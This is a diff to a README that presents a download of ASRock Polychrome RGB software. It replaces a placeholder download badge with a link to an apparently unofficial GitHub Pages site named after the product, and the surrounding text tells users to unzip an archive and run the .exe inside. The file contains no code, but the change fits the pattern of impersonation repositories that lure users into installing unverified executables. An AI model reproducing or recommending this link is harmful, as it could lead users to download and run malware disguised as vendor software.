@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install ASRock Polychrome RGB and detect supported devices automatically.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://asrock-polychrome-rgb.github.io/.github/)
 
 ## 📸 Overview
 ![asrock-polychrome-zones](https://github.com/user-attachments/assets/c8edcdcf-bba3-4b46-b050-491b2870c8ed)
